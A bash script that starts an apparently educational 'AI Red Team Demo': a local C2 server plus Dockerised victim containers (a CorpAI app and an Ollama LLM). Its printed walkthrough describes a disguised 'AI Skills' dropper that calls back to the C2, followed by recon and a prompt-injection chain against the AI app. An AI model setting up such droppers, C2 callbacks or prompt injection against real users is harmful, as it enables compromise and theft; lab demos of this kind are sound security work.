#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
#  Neural-Nexus  ·  Demo Startup Script
#
#  Architecture:
#    HOST       →  C2 server (python server/app.py  — port 5001)
#    DOCKER     →  nn-victim-lab  172.30.0.10:8080
#    DOCKER     →  nn-victim-llm  172.30.0.11:11434  (Ollama)
#
#  The C2 runs directly on the host so it's easy to develop and inspect.
#  Victim services run in Docker on nn-demo-net so Falcon sees them as
#  separate network identities (172.30.0.x) distinct from the host C2.
#
#  Usage:
#    chmod +x start-demo.sh
#    ./start-demo.sh                # full stack
#    ./start-demo.sh --no-model     # skip llama3 pull (already cached)
#    ./start-demo.sh --victim-only  # only Docker victim stack (C2 already up)
#    ./start-demo.sh --c2-only      # only local C2 (victim Docker already up)
#    ./start-demo.sh --down         # tear down Docker stack + kill local C2
#    ./start-demo.sh --logs         # tail all logs
# ─────────────────────────────────────────────────────────────────────────────

set -euo pipefail

# ── Colours ───────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GRN='\033[0;32m'; YEL='\033[1;33m'
CYN='\033[0;36m'; PRP='\033[0;35m'; BLD='\033[1m'; RST='\033[0m'

ok()   { echo -e "${GRN}  ✓${RST}  $*"; }
info() { echo -e "${CYN}  ●${RST}  $*"; }
warn() { echo -e "${YEL}  ⚠${RST}  $*"; }
fail() { echo -e "${RED}  ✗  $*${RST}"; exit 1; }
step() { echo -e "\n${BLD}${PRP}▶ $*${RST}"; }

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

C2_DIR="$SCRIPT_DIR/server"
C2_PID_FILE="$SCRIPT_DIR/.c2.pid"
C2_LOG="$SCRIPT_DIR/.c2.log"
C2_PORT="${C2_PORT:-5001}"
VENV="$SCRIPT_DIR/.venv"

OLLAMA_MODEL="${OLLAMA_MODEL:-llama3}"
PULL_MODEL=true
VICTIM_ONLY=false
C2_ONLY=false
TEAR_DOWN=false
SHOW_LOGS=false

# ── Argument parsing ──────────────────────────────────────────────────────────
for arg in "$@"; do
  case "$arg" in
    --no-model)    PULL_MODEL=false ;;
    --victim-only) VICTIM_ONLY=true ;;
    --c2-only)     C2_ONLY=true ;;
    --down)        TEAR_DOWN=true ;;
    --logs)        SHOW_LOGS=true ;;
    --help|-h)
      sed -n '3,14p' "$0" | sed 's/^#  /  /' | sed 's/^#//'
      exit 0 ;;
    *) warn "Unknown argument: $arg (ignored)" ;;
  esac
done

# ── Banner ────────────────────────────────────────────────────────────────────
clear
echo -e "${PRP}"
cat << 'BANNER'
  ███╗   ██╗███████╗██╗   ██╗██████╗  █████╗ ██╗         ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
  ████╗  ██║██╔════╝██║   ██║██╔══██╗██╔══██╗██║         ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
  ██╔██╗ ██║█████╗  ██║   ██║██████╔╝███████║██║         ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
  ██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██╔══██║██║         ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
  ██║ ╚████║███████╗╚██████╔╝██║  ██║██║  ██║███████╗    ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
  ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
BANNER
echo -e "${RST}"
echo -e "  ${BLD}C2 local · Victim in Docker${RST}  —  AI Red Team Demo"
echo -e "  ${YEL}────────────────────────────────────────────────────────────────${RST}"
echo -e "  ${CYN}HOST${RST}   C2 server           → ${BLD}http://localhost:${C2_PORT}${RST}"
echo -e "  ${PRP}DOCKER${RST} nn-victim-lab        → ${BLD}http://localhost:8080${RST}  (172.30.0.10)"
echo -e "  ${PRP}DOCKER${RST} nn-victim-llm        → ${BLD}http://localhost:11434${RST} (172.30.0.11)"
echo -e "  ${YEL}────────────────────────────────────────────────────────────────${RST}\n"

cd "$SCRIPT_DIR"

# ── Helper: detect compose command ───────────────────────────────────────────
_compose() {
  if docker compose version &>/dev/null 2>&1; then
    docker compose "$@"
  elif command -v docker-compose &>/dev/null; then
    docker-compose "$@"
  else
    fail "docker compose / docker-compose not found"
  fi
}

# ── Tear-down mode ─────────────────────────────────────────────────────────────
if $TEAR_DOWN; then
  step "Tearing down"

  # Kill local C2 if running
  if [[ -f "$C2_PID_FILE" ]]; then
    C2_PID=$(cat "$C2_PID_FILE")
    if kill -0 "$C2_PID" 2>/dev/null; then
      kill "$C2_PID" && ok "C2 process $C2_PID stopped"
    fi
    rm -f "$C2_PID_FILE"
  else
    # Fallback: kill by port
    PIDS=$(lsof -ti :"$C2_PORT" 2>/dev/null || true)
    [[ -n "$PIDS" ]] && echo "$PIDS" | xargs kill -9 2>/dev/null && ok "Killed processes on port $C2_PORT" || true
  fi

  _compose down --remove-orphans 2>/dev/null && ok "Docker victim stack removed" || warn "Nothing to remove"
  docker network rm nn-demo-net 2>/dev/null && ok "Network nn-demo-net removed" || true
  exit 0
fi

# ── Logs mode ─────────────────────────────────────────────────────────────────
if $SHOW_LOGS; then
  echo -e "  ${BLD}Tailing logs (Ctrl-C to stop)${RST}"
  echo -e "  C2 log:   ${CYN}$C2_LOG${RST}"
  echo ""
  trap "exit 0" INT
  tail -f "$C2_LOG" &
  _compose logs -f --no-log-prefix 2>/dev/null
  wait
  exit 0
fi

# ─────────────────────────────────────────────────────────────────────────────
# PREFLIGHT
# ─────────────────────────────────────────────────────────────────────────────
step "Preflight checks"

# Python3
if command -v python3 &>/dev/null; then
  PY_VER=$(python3 --version)
  ok "$PY_VER"
else
  fail "python3 not found"
fi

# Docker
if command -v docker &>/dev/null; then
  DOCKER_VER=$(docker version --format '{{.Server.Version}}' 2>/dev/null || echo "unknown")
  ok "Docker $DOCKER_VER"
else
  fail "Docker not found"
fi

# Compose
if docker compose version &>/dev/null 2>&1; then
  ok "docker compose $(docker compose version --short 2>/dev/null || echo 'v2')"
elif command -v docker-compose &>/dev/null; then
  warn "Using legacy docker-compose — upgrade recommended"
  ok "docker-compose $(docker-compose version --short 2>/dev/null)"
else
  fail "docker compose not found"
fi

# RAM
if command -v free &>/dev/null; then
  TOTAL_MB=$(free -m | awk '/Mem:/{print $2}')
  (( TOTAL_MB < 4096 )) && warn "Only ${TOTAL_MB}MB RAM (Ollama needs 8GB+)" || ok "RAM: ${TOTAL_MB}MB"
fi

# ─────────────────────────────────────────────────────────────────────────────
# LOCAL C2
# ─────────────────────────────────────────────────────────────────────────────
_start_c2() {
  step "Starting C2 server (local)"

  # Check if something is already on the port
  if lsof -ti :"$C2_PORT" &>/dev/null 2>&1; then
    warn "Port $C2_PORT already in use — assuming C2 is already running"
    ok "C2 already up on port $C2_PORT"
    return
  fi

  # Create/update venv
  if [[ ! -f "$VENV/bin/activate" ]]; then
    info "Creating Python venv at $VENV ..."
    python3 -m venv "$VENV"
  fi

  info "Installing/verifying Python deps..."
  "$VENV/bin/pip" install -q --upgrade pip
  "$VENV/bin/pip" install -q -r "$C2_DIR/requirements.txt"
  ok "Dependencies ready"

  # Launch C2 in background, redirect output to log file
  info "Launching server/app.py on port $C2_PORT ..."
  PORT="$C2_PORT" "$VENV/bin/python" "$C2_DIR/app.py" \
    >> "$C2_LOG" 2>&1 &
  C2_PID=$!
  echo "$C2_PID" > "$C2_PID_FILE"

  # Brief wait then verify process is still alive
  sleep 2
  if ! kill -0 "$C2_PID" 2>/dev/null; then
    echo ""
    fail "C2 process exited immediately. Check logs: tail -f $C2_LOG"
  fi
  ok "C2 running (PID $C2_PID) — logs: $C2_LOG"
}

if ! $VICTIM_ONLY; then
  _start_c2
fi

# ─────────────────────────────────────────────────────────────────────────────
# DOCKER NETWORK
# ─────────────────────────────────────────────────────────────────────────────
if ! $C2_ONLY; then
  step "Docker network — nn-demo-net (172.30.0.0/24)"
  if docker network inspect nn-demo-net &>/dev/null 2>&1; then
    ok "Network nn-demo-net already exists"
  else
    docker network create \
      --driver bridge \
      --subnet 172.30.0.0/24 \
      --gateway 172.30.0.1 \
      nn-demo-net &>/dev/null
    ok "Network nn-demo-net created"
  fi

  # ─────────────────────────────────────────────────────────────────────────
  # BUILD + START VICTIM CONTAINERS
  # ─────────────────────────────────────────────────────────────────────────
  step "Building victim images"
  _compose build victim-lab
  ok "Images built"

  step "Starting victim containers"
  info "victim-llm (Ollama) ..."
  _compose up -d victim-llm

  info "victim-lab (CorpAI) ..."
  _compose up -d victim-lab
  ok "Victim containers started"
fi

# ─────────────────────────────────────────────────────────────────────────────
# HEALTH CHECKS
# ─────────────────────────────────────────────────────────────────────────────
step "Waiting for services"

_wait_http() {
  local label="$1" url="$2" max="${3:-60}" elapsed=0
  printf "  %-26s " "$label"
  while (( elapsed < max )); do
    if curl -sf --max-time 2 "$url" >/dev/null 2>&1; then
      echo -e "${GRN}UP${RST}"
      return 0
    fi
    printf "."
    sleep 2
    (( elapsed += 2 ))
  done
  echo -e " ${RED}TIMEOUT${RST}"
  return 1
}

C2_OK=false; VICTIM_OK=false; LLM_OK=false

if ! $VICTIM_ONLY; then
  _wait_http "C2  (localhost:${C2_PORT})"      "http://localhost:${C2_PORT}"       60  && C2_OK=true  || warn "C2 did not respond — check: tail -f $C2_LOG"
fi
if ! $C2_ONLY; then
  _wait_http "Victim-lab  (172.30.0.10:8080)"  "http://localhost:8080/health"      90  && VICTIM_OK=true || warn "Victim-lab did not respond"
  _wait_http "Ollama      (172.30.0.11:11434)" "http://localhost:11434/api/tags"   120 && LLM_OK=true    || warn "Ollama did not respond"
fi

# ─────────────────────────────────────────────────────────────────────────────
# PULL LLM MODEL
# ─────────────────────────────────────────────────────────────────────────────
if ! $C2_ONLY && $PULL_MODEL && $LLM_OK; then
  step "LLM model — $OLLAMA_MODEL"
  if docker exec nn-victim-llm ollama list 2>/dev/null | grep -q "$OLLAMA_MODEL"; then
    ok "Model $OLLAMA_MODEL already cached"
  else
    info "Pulling $OLLAMA_MODEL (one-time ~4 GB download)..."
    docker exec nn-victim-llm ollama pull "$OLLAMA_MODEL" \
      && ok "Model ready" \
      || warn "Pull failed — retry: docker exec nn-victim-llm ollama pull $OLLAMA_MODEL"
  fi
fi

# ─────────────────────────────────────────────────────────────────────────────
# SUMMARY
# ─────────────────────────────────────────────────────────────────────────────
step "Stack ready"
echo ""

# Detect host IP for remote-access hint
HOST_IP=$(ip route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1)}' || hostname -I 2>/dev/null | awk '{print $1}' || echo "")

echo -e "  ${BLD}${PRP}Network layout:${RST}"
echo -e "  ${YEL}┌────────────────────────────────────────────────────────────────────┐${RST}"
printf  "  ${YEL}│${RST}  %-8s  %-28s  %-22s  ${YEL}│${RST}\n" "WHERE"  "ADDRESS"                        "URL"
echo -e "  ${YEL}├────────────────────────────────────────────────────────────────────┤${RST}"
printf  "  ${YEL}│${RST}  %-8s  %-28s  %-22s  ${YEL}│${RST}\n" "${CYN}HOST${RST}   " "host-process  :${C2_PORT}"            "http://localhost:${C2_PORT}"
printf  "  ${YEL}│${RST}  %-8s  %-28s  %-22s  ${YEL}│${RST}\n" "${PRP}DOCKER${RST} " "172.30.0.10   :8080 (victim-lab)"     "http://localhost:8080"
printf  "  ${YEL}│${RST}  %-8s  %-28s  %-22s  ${YEL}│${RST}\n" "${PRP}DOCKER${RST} " "172.30.0.11   :11434 (ollama)"        "http://localhost:11434"
echo -e "  ${YEL}└────────────────────────────────────────────────────────────────────┘${RST}"
echo ""

echo -e "  ${BLD}Demo walkthrough:${RST}"
echo -e "  ${CYN}①${RST}  Victim opens ${BLD}http://localhost:8080${RST}  (CorpAI Assistant)"
echo -e "  ${CYN}②${RST}  Victim clicks ${BLD}\"Install Neural Nexus AI Skills\"${RST} → downloads dropper"
echo -e "  ${CYN}③${RST}  Victim runs the skill — connects back to host C2:"
echo -e "     ${YEL}python victim-lab/skill/neural_nexus_skill.py --c2 http://localhost:${C2_PORT}${RST}"
echo -e "  ${CYN}④${RST}  Operator opens ${BLD}http://localhost:${C2_PORT}${RST} → sees agent checked in"
echo -e "  ${CYN}⑤${RST}  Run AutoRecon → discovers victim-lab at 172.30.0.10:8080"
echo -e "  ${CYN}⑥${RST}  Click ${BLD}LAUNCH AI HUNTER${RST} → prompt injection chain"
echo ""

if [[ -n "$HOST_IP" && "$HOST_IP" != "127.0.0.1" ]]; then
  echo -e "  ${BLD}Remote access (same LAN):${RST}"
  echo -e "  C2  →  ${CYN}http://${HOST_IP}:${C2_PORT}${RST}"
  echo -e "  Lab →  ${CYN}http://${HOST_IP}:8080${RST}"
  echo ""
fi

echo -e "  ${BLD}Useful commands:${RST}"
echo -e "  ${YEL}tail -f $C2_LOG${RST}                          # C2 live log"
echo -e "  ${YEL}docker compose logs -f nn-victim-lab${RST}      # Victim-lab log"
echo -e "  ${YEL}docker network inspect nn-demo-net${RST}        # Verify IPs"
echo -e "  ${YEL}./start-demo.sh --logs${RST}                    # Tail everything"
echo -e "  ${YEL}./start-demo.sh --down${RST}                    # Tear down all"
echo ""
